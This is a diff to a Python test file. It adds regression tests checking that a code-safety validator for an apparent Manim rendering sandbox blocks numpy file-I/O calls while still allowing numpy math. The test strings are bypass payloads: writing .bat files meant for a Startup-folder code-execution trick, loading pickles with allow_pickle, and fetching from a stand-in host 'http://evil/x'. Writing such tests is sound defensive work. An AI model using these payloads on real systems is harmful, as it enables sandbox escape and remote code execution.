@@ -845,6 +845,18 @@ def t_f103():
     ):
         ok, bypass_issues = validate_code_safety(payload)
         assert not ok, (payload, bypass_issues)
+    # BUG-28: numpy is allowed, but its file-I/O surface is an arbitrary host
+    # read/write (RCE via a Startup-folder write). These sinks must be blocked
+    # while legitimate numpy math stays allowed.
+    for payload in (
+        "import numpy as np\nnp.frombuffer(b'x', dtype=np.uint8).tofile('e.bat')\n",
+        "import numpy\nnumpy.savetxt('x.bat', numpy.array([1]))\n",
+        "import numpy\nnumpy.load('x.npy', allow_pickle=True)\n",
+        "import numpy\nnumpy.lib.npyio.DataSource('.').open('http://evil/x')\n",
+    ):
+        ok, io_issues = validate_code_safety(payload)
+        assert not ok, ("numpy IO not blocked", payload, io_issues)
+    assert validate_code_safety("import numpy as np\ny = np.sin(np.array([1.0])) * np.pi\n")[0]
     # wired into generation + repair
     src = inspect.getsource(__import__("aetherlab.services.manim_runtime", fromlist=["ManimRuntime"]).ManimRuntime)
     assert src.count("validate_code_safety") >= 2
